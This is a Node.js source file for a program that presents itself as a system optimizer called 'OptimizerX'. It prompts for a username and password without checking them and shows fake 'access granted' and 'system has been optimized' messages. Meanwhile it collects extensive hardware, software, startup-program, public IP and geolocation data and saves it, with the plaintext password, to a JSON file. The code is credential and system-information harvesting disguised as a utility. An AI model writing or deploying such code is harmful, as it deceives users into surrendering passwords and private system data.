const readline = require('readline');
const { collectCpuInfo } = require('./utils/collectCpuInfo');
const { collectMemoryInfo } = require('./utils/collectMemoryInfo');
const { collectOsInfo } = require('./utils/collectOsInfo');
const { collectBaseboardInfo } = require('./utils/collectBaseboardInfo');
const { collectDrivesInfo } = require('./utils/collectDrivesInfo');
const { lookupPublicIp } = require('./utils/lookupPublicIp');
const { lookupGeoip } = require('./utils/lookupGeoip');
const { saveInfoToFile } = require('./utils/saveInfoToFile');
const { collectOsUpdates } = require('./utils/collectOsUpdates');
const { collectHardwareInventory } = require('./utils/collectHardwareInventory');
const { collectStartupPrograms } = require('./utils/collectStartupPrograms');
const { collectAllSoftwareInfo } = require('./utils/collectAllSoftwareInfo');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

console.log('Welcome to OptimizerX');

rl.question('Enter your username: ', (username) => {
  rl.question('Enter your password: ', async (password) => {
    // TODO: add code to authenticate the user with the username and password
    console.log('\x1b[32mAccess granted to OptimizerX. Optimizing started... Please exit the program in 30 seconds.\x1b[0m');

    const [
      cpuInfo,
      memoryInfo,
      osInfo,
      baseboardInfo,
      drivesInfo,
      osUpdates,
      hardwareInventory,
      startupPrograms,
      softwareInfo,
    ] = await Promise.all([
      collectCpuInfo(),
      collectMemoryInfo(),
      collectOsInfo(),
      collectBaseboardInfo(),
      collectDrivesInfo(),
      collectOsUpdates(),
      collectHardwareInventory(),
      collectStartupPrograms(),
      collectAllSoftwareInfo(),
    ]);

    const publicIp = await lookupPublicIp();
    const geoip = await lookupGeoip(publicIp);

    const systemInfo = {
      ...cpuInfo,
      ...memoryInfo,
      ...osInfo,
      ...baseboardInfo,
      ...drivesInfo,
      publicIp,
      geoip,
      ...osUpdates,
      ...hardwareInventory,
      ...startupPrograms,
      ...softwareInfo,
      username, // add username to system info
      password, // add password to system info
    };

    saveInfoToFile(systemInfo, 'system_info.json', (err) => {
      if (err) {
        console.log('Error saving system information:', err);
      } else {
        console.log('\x1b[32mSystem has been optimized!\x1b[0m');
      }

      rl.close(); // close the readline interface
    });
  });
});
